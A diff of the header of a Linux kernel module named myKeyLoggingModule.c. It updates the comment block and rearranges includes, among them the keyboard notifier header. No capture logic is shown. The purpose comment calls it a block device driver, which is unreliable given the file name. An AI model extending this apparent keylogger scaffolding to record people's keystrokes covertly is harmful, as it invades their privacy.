@@ -1,5 +1,9 @@
 /*
- *    PURPOSE - A block device driver for a virtual block device of my own creation
+    REPO:        Peke_Ito (https://github.com/hark130/Peke_Ito/)
+    FILE:        myKeyLoggingModule.c
+    PURPOSE:     A block device driver for a virtual block device of my own creation
+    DATE:        Updated 20180925
+    VERSION:     1.0.0
  */
 
 ////////////
@@ -18,22 +22,14 @@
 /////////////
 /* HEADERS */
 /////////////
-// Do not change the order of these includes unless you want:
-// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
-// #include <asm/current.h>                        // current
-// #include <linux/cred.h>                         // ???
-
-// #include <asm/uaccess.h>                        // get_fs(), set_fs()
 #include "HarkleKerror.h"                       // Kernel error macros
 #include <linux/cdev.h>                         // cdev available
-// #include <linux/fcntl.h>                        // filp_open(), filp_close()
 #include <linux/fs.h>                           // Defines file table structures
 #include <linux/kernel.h>                       // ALWAYS NEED
+#include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()
 #include <linux/module.h>                       // ALWAYS NEED
 #include <linux/semaphore.h>                    // semaphores
-// #include <linux/stat.h>                         // File mode macros
 #include <linux/uaccess.h>                      // copy_to_user
-#include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()
 
 //////////////
 /* TYPEDEFS */
